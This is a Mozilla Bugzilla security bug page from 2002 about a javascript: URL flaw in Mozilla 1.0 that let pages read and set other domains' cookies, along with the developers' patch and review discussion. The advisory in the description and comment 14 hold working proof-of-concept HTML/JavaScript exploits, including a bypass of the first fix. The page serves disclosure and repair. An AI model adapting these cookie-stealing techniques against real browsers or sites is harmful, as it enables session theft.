=== Content from bugzilla.mozilla.org_39d27f04_20250125_144545.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/152725)
* [XML](/show_bug.cgi?ctype=xml&id=152725)

Closed
[Bug 152725](/show_bug.cgi?id=152725)

Opened 23 years ago
Closed 23 years ago

# Possible cookie stealing using javascript: URLs

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Possible cookie stealing using javascript: URLs

## Categories

### (Core :: Networking: Cookies, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Networking%3A%20Cookies#Networking%3A%20Cookies)

Networking: Cookies
▾

Core :: Networking: Cookies
A general mechanism which server side connections (such as CGI scripts) can use to both store and retrieve information on the client side of the connection. This refers to HTML cookies; little blobs of data we store and share with sites
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Networking%3A%20Cookies&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Networking%3A%20Cookies&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Networking%3A%20Cookies)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Trunk

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla1.0.1

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Priority | --- |
| --- | --- |
| a11y-review | --- |
| Webcompat Score | --- |
| Performance Impact | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: security-bugs, Assigned: security-bugs)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/4182f3acd4edf78ac80bd02f43a54a60?d=mm&size=40)  [security-bugs](/user_profile?user_id=6444)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

![](https://secure.gravatar.com/avatar/d4d1c6f5ae3a4d53f8e602d6ec9cd07c?d=mm&size=40)  [tever](/user_profile?user_id=6872)

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/4182f3acd4edf78ac80bd02f43a54a60?d=mm&size=40)  [security-bugs](/user_profile?user_id=6444)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/608e04ebca94be52b05c003d51d43e07?d=mm&size=40)  [kershaw](/user_profile?user_id=505624)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

16 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[143047](/show_bug.cgi?id=143047 "RESOLVED FIXED - GO GO Speed Racer!")

Dependency [tree](/showdependencytree.cgi?id=152725&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=152725)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[159152](/show_bug.cgi?id=159152 "VERIFIED DUPLICATE - Javascript can steal cookies from other domains")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: topembed, Whiteboard: [adt1 RTM] [ETA 07/13])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[topembed](/buglist.cgi?keywords=topembed&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adt1 RTM] [ETA 07/13]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files, 1 obsolete file)

| [Preliminary patch](/attachment.cgi?id=88718)  [23 years ago](#c2)  [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)   2.35 KB, patch |  | [Details](/attachment.cgi?id=88718&action=edit) | [Diff](/attachment.cgi?id=88718&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=88718) |
| --- | --- | --- |
| [patch v2](/attachment.cgi?id=89489)  [23 years ago](#c4)  [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)   9.80 KB, patch | morse : [review+](#c5 "23 years ago")  dveditz : [superreview+](#c8 "23 years ago")  asa : [approval+](#c29 "23 years ago") | [Details](/attachment.cgi?id=89489&action=edit) | [Diff](/attachment.cgi?id=89489&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=89489) |
| [Add'l patch - use nsIURIs all the way through](/attachment.cgi?id=91045)  [23 years ago](#c18)  [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)   16.42 KB, patch | morse : [review+](#c22 "23 years ago")  dveditz : [superreview+](#c27 "23 years ago")  asa : [approval+](#c30 "23 years ago") | [Details](/attachment.cgi?id=91045&action=edit) | [Diff](/attachment.cgi?id=91045&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91045) |
| [Possible alternative - safer but slower](/attachment.cgi?id=91152)  [23 years ago](#c23)  [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)   2.04 KB, patch | morse : [review+](#c25 "23 years ago")  jst : [superreview+](#c26 "23 years ago") | [Details](/attachment.cgi?id=91152&action=edit) | [Diff](/attachment.cgi?id=91152&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91152) |
| [Patch for 0.9.4 branch](/attachment.cgi?id=93118)  [22 years ago](#c35)  [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)   1.93 KB, patch |  | [Details](/attachment.cgi?id=93118&action=edit) | [Diff](/attachment.cgi?id=93118&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=93118) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=152725#c0)• 23 years ago |
|  | |

---..---..---..---..---..---..---..---..---..---..---..---..----
Title: Mozilla 1.0 XSS - Reading/setting arbitrary cookie
Date: [2002-06-19]
Software: Mozilla 1.0
Impact: At least reading/setting arbitrary cookie
Vendor: <http://www.mozilla.org> \_ \_
Workaround: Disable javascript o' \,=./ `o
Author: Andreas Sandblad, sandblad@acc.umu.se (o o)
---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(\_)--Ooo---
DESCRIPTION:
============
Mozilla allows script in the javascript protocoll to set and read cookies.
The operating host and path is determined in similiar way as for http
urls, namely as "javascript:[host][path]". Cookie security is based only
on host and path. By carefully crafting a mallicious javascript link
opened in a new window, it is possible to access and alter cookies from
other domains.
EXPLOIT:
========
Setting a host not generating any javascript errors may seem difficult but
can easily be done using some tricks. It is done by fooling Mozilla into
thinking the host is a legal variable. Using the fact that dots in
javascript represents a way to access members in objects, we can create a
complete valid host not generating any javascript errors. Setting a legal
"/" path is done by understanding that "host/ 1" is ok as long as the host
variable is an integer. The number "1" will not be included in the path
because there is a space between "/" and "1".
NOTE: Exploit is designed for default settings in Mozilla and has been
tested on win32 (3 machines) and freeBSD (1 machine). On win32 the timer
can be set to 0, but on freeBSD it has to be set to something like 50 ms.
The timer is set to 2000 ms just in case.
-------------------------- CUT HERE ----------------------------
<pre>
Title: Mozilla 1.0 XSS Exploit
Date: [2002-06-19] \_ \_
Impact: Reading/setting arbitrary cookie o' \,=./ `o
Author: Andreas Sandblad, sandblad@acc.umu.se (o o)
---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(\_)--Ooo---
</pre>
<a href="javascript:readCookie();">Read google cookie (must be
set)</a><br>
<a href="javascript:setCookie();">Set www.mozilla.org cookie</a>
<script>
function readCookie()
{
s = "javascript:function f(){com=1} google=new f();" +
"location='javascript:google.com/1;" +
"setTimeout(\"alert(document.cookie);close()\",2000);\"\"'";
open(s);
}
function setCookie()
{
s = "javascript:function f(){org=1} function g(){mozilla=f} " +
"www=new g();www.mozilla=new f();" +
"location='javascript:www.mozilla.org/1;" +
"setTimeout(\"document.cookie=\\'YOUARE=VULNERABLE;" +
"path=/;expires=Fri, 13 Dec 2003 23:59:59 GMT;\\';" +
"alert(\\'cookie set\\');close()\",2000);\"\"'";
open(s);
}
</script>
-------------------------- CUT HERE ----------------------------
Disclaimer:
===========
Andreas Sandblad is not responsible for the misuse of the
information provided in this advisory. The opinions expressed
are my own and not of any company. In no event shall the author
be liable for any damages whatsoever arising out of or in
connection with the use or spread of this advisory. Any use of
the information is at the user's own risk.
Old advisories:
===============
#7 [2002-05-19] "IE dot bug"
<http://online.securityfocus.com/archive/1/273168>
#6 [2002-05-15] "Opera javascript protocoll vulnerability"
<http://online.securityfocus.com/archive/1/272583>
#5 [2002-04-26] "Mp3 file can execute code in Winamp."
<http://online.securityfocus.com/archive/1/269724>
#4 [2002-04-15] "Using the backbutton in IE is dangerous."
<http://online.securityfocus.com/archive/1/267561>
CREDITS:
========
(for helping me testing the vulnerability)
Ingesson (freeBSD), Quitta (win32), Hawkan (win32)
Feedback:
=========
Please send suggestions and comments to: \_ \_
sandblad@acc.umu.se o' \,=./ `o
(o o)
---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(\_)--Ooo---
Andreas Sandblad,
student in Engineering Physics at Umea University, Sweden.
-/---/---/---/---/---/---/---/---/---/---/---/---/---/---/---/--

|  | [Jaime Rodriguez, Jr.](/user_profile?user_id=16235) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a8666_16235)• 23 years ago |

Keywords: [nsbeta1](/buglist.cgi?keywords=nsbeta1&resolution=---)Whiteboard: [Need Impact] [ETA Needed]

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=152725#c1)• 23 years ago |
|  | |

This is the same code-level problem as [bug 90644](/show_bug.cgi?id=90644 "VERIFIED FIXED - ftp://foo/ and http://foo/ share cookies"), "ftp://foo/ and <http://foo/>
share cookies", but more serious.

|  | [Jaime Rodriguez, Jr.](/user_profile?user_id=16235) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a247004_16235)• 23 years ago |

Blocks: [143047](/show_bug.cgi?id=143047 "RESOLVED FIXED - GO GO Speed Racer!")Keywords: [nsbeta1](/buglist.cgi?keywords=nsbeta1&resolution=---) → [mozilla1.0.1](/buglist.cgi?keywords=mozilla1.0.1&resolution=---),
[nsbeta1+](/buglist.cgi?keywords=nsbeta1%2B&resolution=---),
[topembed](/buglist.cgi?keywords=topembed&resolution=---)Whiteboard: [Need Impact] [ETA Needed] → [adt1 RTM] [ETA 06/26]Target Milestone: --- → mozilla1.0.1

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=152725#c2)• 23 years ago |
|  | |

Attached patch

[Preliminary patch](attachment.cgi?id=88718&action=diff) (obsolete)
— [Details](attachment.cgi?id=88718&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=88718)

This patch fixes the problem, but may have some issues. The problem is that the
document URL is a javascript URL, and the URL parser is pulling a "host" out of
the javascript URL (everything between the colon and the first /) which is
wrong. What we really want in this case is not the document URL but the
document principal, which in the case of a javascript: URL page, is the
principal of the page the javascript: URL came from (the attacker's site, in
this case).
The biggest problem with this approach is that setting document.domain via the
DOM changes the document principal. In the case of setting document.domain on
the javascript: URL page itself (the second window opened by the above
example), I'm not sure what will happen. In the case of setting document.domain
on the page that calls window.open on a javascript: URL (the first page,
above), the cookie will be set to the domain assigned to document.domain. I'm
not sure if this is bad - probably not, since cookies can be set to
superdomains of the current host (right?) and that's what document.domain
allows. So a page on foo.mcom.com could set a cookie at .mcom.com, or .com if
it really wanted to.
The other potential problem is with chrome pages (such as some of the about:
pages), although I don't know why a chrome page would be setting or reading a
cookie, so that's probably OK.

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=152725#c3)• 23 years ago |
|  | |

I'll take this since I'm working on the fix.Assignee: morse → mstoltz

|  | [Jaime Rodriguez, Jr.](/user_profile?user_id=16235) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a688281_16235)• 23 years ago |

Whiteboard: [adt1 RTM] [ETA 06/26] → [adt1 RTM] [ETA 06/27]

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=152725#c4)• 23 years ago |
|  | |

Attached patch

[patch v2](attachment.cgi?id=89489&action=diff)
— [Details](attachment.cgi?id=89489&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=89489)

OK this fixes both the case described and a related exploit using a META tag.
Testcases can be found (inside Netscape) at
<http://warp.mcom.com/u/mstoltz/bugs/152725.html>
<http://warp.mcom.com/u/mstoltz/bugs/152725d.html>
We may also want to add a belt-and-suspenders patch in nsCookies.cpp that
specifically prevents parsing a "host" out of a URL that doesn't really have
one, like javascript:. The best way to do that is to have COOKIE\_GetCookie and
COOKIE\_SetCookieString accept nsIURIs instead of strings - this is also a
performance win - but I'm a little afraid to do that on the branch. We could
hack in a check for javascript: URLs instead.
[Attachment #88718](/attachment.cgi?id=88718&action=edit "Preliminary patch") -
Attachment is obsolete: true

|  | [Stephen P. Morse](/user_profile?user_id=3876) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=152725#c5)• 23 years ago |
|  | |

Comment on [attachment 89489](/attachment.cgi?id=89489 "patch v2") [[details]](/attachment.cgi?id=89489&action=edit "patch v2") [[diff]](/attachment.cgi?id=89489&action=diff "patch v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=89489)
patch v2
r=morse
[Attachment #89489](/attachment.cgi?id=89489&action=edit "patch v2") -
Flags: review+

|  | [Heikki Toivonen (remove -bugzilla when emailing directly)](/user_profile?user_id=4030) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=152725#c6)• 23 years ago |
|  | |

I think the XML content sink needs a similar check. Steve and Mitch, are there
other cookie security fixes that have landed into the HTML content sink but not
the XML content sink? And for the future, please keep in mind that HTML and XML
content sinks have a lot of duplicate code that needs to be kept up to date
manually (until [bug 21771](/show_bug.cgi?id=21771 "RESOLVED WONTFIX - Factor out code among the HTML/XML/XUL content sinks") gets fixed).

|  | [Stephen P. Morse](/user_profile?user_id=3876) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=152725#c7)• 23 years ago |
|  | |

To the best of my recollection, this is the first cookie security fix that has
landed in the HTML content sink. Most of them have been in the cookie module
itself.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=152725#c8)• 23 years ago |
|  | |

Comment on [attachment 89489](/attachment.cgi?id=89489 "patch v2") [[details]](/attachment.cgi?id=89489&action=edit "patch v2") [[diff]](/attachment.cgi?id=89489&action=diff "patch v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=89489)
patch v2
sr=dveditz for this much, but nsXMLContentSink needs equivalent code before you
check in.
[Attachment #89489](/attachment.cgi?id=89489&action=edit "patch v2") -
Flags: superreview+

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=152725#c9)• 23 years ago |
|  | |

Checked in (with equivalent code in XMLContentSink) on the trunk. Please verify
with the two tests in [comment 4](/show_bug.cgi?id=152725#c4 "VERIFIED FIXED - Possible cookie stealing using javascript: URLs").Status: NEW → RESOLVEDClosed: 23 years agoResolution: --- → FIXED

|  | [Paul Wyskoczka](/user_profile?user_id=4386) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=152725#c10)• 23 years ago |
|  | |

trever, can you verify this fix on the trunk. thx.

|  | [scottputterman](/user_profile?user_id=4448) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a1206971_4448)• 23 years ago |

Keywords: [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---)

|  | [Jaime Rodriguez, Jr.](/user_profile?user_id=16235) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a1703027_16235)• 23 years ago |

Whiteboard: [adt1 RTM] [ETA 06/27] → [adt1 RTM] [ETA 07/08]

|  | [Tom Everingham](/user_profile?user_id=6872) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=152725#c11)• 23 years ago |
|  | |

using testcases supplied in [comment #4](/show_bug.cgi?id=152725#c4 "VERIFIED FIXED - Possible cookie stealing using javascript: URLs"), verified cookie is not stolen anymore
and that correct domains were being set. Ran general regression tests.
verified trunk - 07/08/2002 builds - win NT4, Linux rh6, mac osX
will need testing on branchStatus: RESOLVED → VERIFIEDWhiteboard: [adt1 RTM] [ETA 07/08] → [adt1 RTM] [ETA 07/08][verified-trunk]

|  | [scottputterman](/user_profile?user_id=4448) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=152725#c12)• 23 years ago |
|  | |

adding adt1.0.1+. Please get drivers approval before checking into the branch.Keywords: [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---) → [adt1.0.1+](/buglist.cgi?keywords=adt1.0.1%2B&resolution=---)

|  | [Jaime Rodriguez, Jr.](/user_profile?user_id=16235) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a1728265_16235)• 23 years ago |

Keywords: [adt1.0.1+](/buglist.cgi?keywords=adt1.0.1%2B&resolution=---) → [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---),
[approval](/buglist.cgi?keywords=approval&resolution=---)Whiteboard: [adt1 RTM] [ETA 07/08][verified-trunk] → [adt1 RTM] [ETA 07/09][verified-trunk]

|  | [Paul Wyskoczka](/user_profile?user_id=4386) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=152725#c13)• 23 years ago |
|  | |

Adding the + to the keywordKeywords: [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---) → [adt1.0.1+](/buglist.cgi?keywords=adt1.0.1%2B&resolution=---)

|  | [Andreas Sandblad](/user_profile?user_id=57763) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=152725#c14)• 23 years ago |
|  | |

BYPASS FIX
It seems like your fix can be bypassed quite easily. Exploit below has been
tested to work on Mozilla build 20020708 (win32). The trick is the use of reload.
Exploit now use //host\n to get correct host.
/Andreas Sandblad
<pre>
Title: Mozilla 1.0 Cookie Exploit (javascript: flaw)
Date: [2002-07-09] \_ \_
Impact: Steal/spoof arbitrary cookie o' \,=./ `o
Author: Andreas Sandblad, sandblad@acc.umu.se (o o)
---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(\_)--Ooo---
</pre>
<iframe name=f height=0 width=0 style=visibility:hidden></iframe>
<script>
function init(){
f.location = "javascript://www.google.com/\n"+
"'<body onload=alert(document.cookie)>'";
setTimeout('f.location.reload(false);',1000);
} window.onload=setTimeout('init()',1000);
</script>

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=152725#c15)• 23 years ago |
|  | |

I have confirmed that the above variation works. I was afraid of that - there
are other ways of getting a document's principal to be a javascript URL other
than the ways addressed by the above patch. Apparently, calling location.reload
makes the page's principal be the javascript: URL. This appears to be an error,
probably in the docshell code - the principal should still be the page that
originated the javascript URL - the attacker's page in this case.
So, I will do two things - ensure that reload() inherits page principals
correctly for javascript: pages, \*and\* do a low-level check in the cookie code
to make sure no javascript: URLs get passed in. We may even want to whitelist
the protocols that can set cookies. I thought of doing the low-level check
before, but I was afraid about regressions on the branch. Given this new
variation, I think we need to prevent any javascript URLs from reaching the
cookie code.Status: VERIFIED → REOPENEDKeywords: [adt1.0.1+](/buglist.cgi?keywords=adt1.0.1%2B&resolution=---),
[approval](/buglist.cgi?keywords=approval&resolution=---),
[nsbeta1+](/buglist.cgi?keywords=nsbeta1%2B&resolution=---) → [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---),
[nsbeta1](/buglist.cgi?keywords=nsbeta1&resolution=---)Resolution: FIXED → ---Whiteboard: [adt1 RTM] [ETA 07/09][verified-trunk] → [adt1 RTM][eta 7/10]

|  | [Jaime Rodriguez, Jr.](/user_profile?user_id=16235) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=152725#c16)• 23 years ago |
|  | |

Removing adt1.0.1, as this bug has been reopened. Pls update the ETA. thanks!Keywords: [adt1.0.1](/buglist.cgi?keywords=adt1.0.1&resolution=---),
[nsbeta1](/buglist.cgi?keywords=nsbeta1&resolution=---) → [nsbeta1+](/buglist.cgi?keywords=nsbeta1%2B&resolution=---)Whiteboard: [adt1 RTM][eta 7/10] → [adt1 RTM] [ETA 07/13]

|  | [Andreas Sandblad](/user_profile?user_id=57763) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=152725#c17)• 23 years ago |
|  | |

It is also possible to bypass the fix using back and forward tricks in the
history list (history.back()), instead of using reload. Whitelist
the protocols that can set cookies must be the best solution (as Mitchell Stoltz
suggest).
/Andreas Sandblad

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=152725#c18)• 23 years ago |
|  | |

Attached patch

[Add'l patch - use nsIURIs all the way through](attachment.cgi?id=91045&action=diff)
— [Details](attachment.cgi?id=91045&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91045)

OK, I've got a possible fix for this second issue. This complements but does
not replace patch v2 above - both should go in.
This version changes the nsCookies.h API, which is AFAIK called only from
nsCookieService.cpp, to accept nsIURIs instead of URLs in char\* form. Then, we
use GetHostPort() to extract the host and port instead of ExtractURLPart().
That way, the code will recognize that some URL schemes, like javascript:, have
no host, and we will not attempt to read a host from a javascript URL (or
about:, or any other nsSimpleURI). This has the advantage of avoiding a
significant bit of unnecessary work - currently, we turn nsIURIs into strings
and then parse them into component parts again. With this patch, we make use of
the URL parsing that was already done elsewhere, which should give us a
performance win on every page load.
The downside to this patch for the branch is that it may be risky. This patch
depends on the assumption that the host:port and path strings returned from
nsIURI::GetHostPort and nsIURI::GetPath are identical to those returned by
ExtractURLPart(). For the most important protocols, this is probably the case.
For some other protocols, the parsing may give slightly different results,
which may affect how cookies are stored for those protocols, but being able to
set cookies from pages loaded by obscure protocols isn't all that important
anyway.
I recommend taking this patch for the branch after a few days of trunk testing,
despite the risk. I do have a simpler, less risky patch which accomplishes the
same thing, but that one will make a bad performance situation even worse by
adding yet another round of URL parsing per page load and per cookie set.

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=152725#a1992367_6444)• 23 years ago |

Keywords: [patch](/buglist.cgi?keywords=patch&resolution=---),
[review](/buglist.cgi?keywords=review&resolution=---)

|  | [Doug Turner (:dougt)](/user_profile?user_id=302291) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=152725#c19)• 23 years ago |
|  | |

steve, you okay with using nsIURI's at this level?

|  | [Stephen P. Morse](/user_profile?user_id=3876) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=152725#c20)• 23 years ago |
|  | |

Nice job of simplification. However I too am very concerned with the risk of
regression.

|  | [Stephen P. Morse](/user_profile?user_id=3876) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=152725#c21)• 23 years ago |
|  | |

dougt: yes, that part I'm ok with.

|  | [Stephen P. Morse](/user_profile?user_id=3876) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=152725#c22)• 23 years ago |
|  | |

Comment on [attachment 91045](/attachment.cgi?id=91045 "Add'l patch - use nsIURIs all the way through") [[details]](/attachment.cgi?id=91045&action=edit "Add'l patch - use nsIURIs all the way through") [[diff]](/attachment.cgi?id=91045&action=diff "Add'l patch - use nsIURIs all the way through") [[review]](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91045)
Add'l patch - use nsIURIs all the way through
r=morse
[Attachment #91045](/attachment.cgi?id=91045&action=edit "Add'l patch - use nsIURIs all the way through") -
Flags: review+

|  | [Mitchell Stoltz (not reading bugmail)](/user_profile?user_id=6444)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=152725#c23)• 23 years ago |
|  | |

Attached patch

[Possible alternative - safer but slower](attachment.cgi?id=91152&action=diff)
— [Details](attachment.cgi?id=91152&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=152725&attachment=91152)

Here's a possible alternative which also fixes the exploit, but it's much safer
- it adds an additional check when getting or setting cookies but doesn't
otherwise alter any existing code. However, this patch is much worse than the
other one, performance-wise, and will probably add to page-load times a bit.
Steve, which one do you think we should use?

|  | [Stephen P. Morse](/user_profile?user_id=3876) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=152725#c24)• 23 years ago |
|  | |

My vote would be to go with the safer one on the branch and the more efficient
one on the trunk. The increase in page loading is on the order of milliseconds
so it's not a big issue; however potentially breaking websites at this late date
is a big issue.

|  | [Stephen P. Morse](/user_profile?user_id=3876) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=152725#c25)• 23 years ago |
|  | |

